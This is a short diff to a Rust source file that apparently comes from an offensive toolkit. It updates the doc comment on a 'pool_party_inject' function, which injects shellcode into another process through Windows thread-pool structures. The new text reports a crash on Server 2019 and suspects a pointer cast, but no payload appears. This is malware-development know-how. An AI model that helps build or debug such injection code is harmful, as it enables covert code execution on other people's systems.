@@ -197,14 +197,16 @@ pub struct TpWork {
 /// 7. The scheduler dispatches → shellcode executes from the section view.
 /// 8. Unmap the local view; the target view persists until shellcode returns.
 ///
-/// # ⚠ Research-grade
-/// The TP structure manipulation (steps 5–6) is the research-grade core. It
-/// requires locating the worker's `_TP_WORK` queue head and the in-memory
-/// layout of an enqueued work item. The implementation below covers steps 1–4
-/// (the section-backed delivery) and provides the TP-direct overwrite scaffold
-/// for step 6, but the worker-thread discovery (step 5) needs a real target to
-/// validate the `TppWorkerThread` start-address signature. On failure the
-/// caller degrades to `module_stomp`.
+/// # ⚠ Research-grade — KNOWN CRASH on real target (2026-07-06)
+/// Tested on Server 2019 17763.1339 via `nyx_selftest_inject_pool`:
+/// returns `0xC0000005 STATUS_ACCESS_VIOLATION`. The crash is in the
+/// `NtCreateSection` / `NtMapViewOfSection` call path — likely the
+/// `&mut local_base as *mut *mut c_void` pointer-level conversion is wrong
+/// (NtMapViewOfSection wants `**PVOID`, and the Rust ref-to-double-pointer
+/// cast may not produce the right ABI). The section delivery needs a debugger
+/// pass on a real target to fix the calling convention. Until then this fn
+/// WILL crash if called — the `POOL_PARTY_ENABLED` gate must stay OFF in
+/// production builds, and `do_inject(method=0)` degrades to module_stomp.
 pub unsafe fn pool_party_inject(
     target_pid: u32,
     shellcode: &[u8],
